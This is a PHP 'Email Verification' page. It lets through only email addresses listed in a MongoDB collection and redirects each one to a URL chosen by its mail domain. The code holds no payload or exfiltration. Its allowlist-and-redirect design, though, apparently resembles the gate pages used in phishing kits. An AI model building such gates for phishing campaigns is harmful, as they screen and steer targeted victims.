<?php
session_start();
require_once 'config.php';

$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = filter_var(trim($_POST['email'] ?? ''), FILTER_SANITIZE_EMAIL);
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = 'Invalid email format';
    } else {
        try {
            $collection = $db->emails;
            $existingEmail = $collection->findOne(['email' => $email]);
            
            if ($existingEmail) {
                $domain = substr(strrchr($email, "@"), 1);
                
                $redirectMapFile = 'redirect_map.json';
                if (file_exists($redirectMapFile)) {
                    $redirectUrls = json_decode(file_get_contents($redirectMapFile), true);
                } else {
                    $redirectUrls = [
                        'gmail.com' => 'https://gmail.com',
                        'yahoo.com' => 'https://yahoo.com',
                        'outlook.com' => 'https://outlook.com',
                        'hotmail.com' => 'https://outlook.com',
                        'live.com' => 'https://outlook.com',
                        'default' => 'https://example.com'
                    ];
                }
                
                $redirectUrl = $redirectUrls[$domain] ?? $redirectUrls['default'] ?? 'https://example.com';
                
                header('Location: ' . $redirectUrl);
                exit;
            } else {
                $error = 'Access denied. Email not authorized.';
            }
        } catch (Exception $e) {
            $error = 'Database connection error';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Verification</title>
    <link rel="stylesheet" href="assets/style.css">
</head>
<body>
    <div class="container">
        <div class="verify-box">
            <h1>Email Verification</h1>
            <p>Enter your authorized email address</p>
            
            <?php if ($error): ?>
                <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <form method="POST" class="verify-form">
                <div class="input-group">
                    <input type="email" name="email" placeholder="Enter your email" required>
                    <button type="submit">Verify Access</button>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
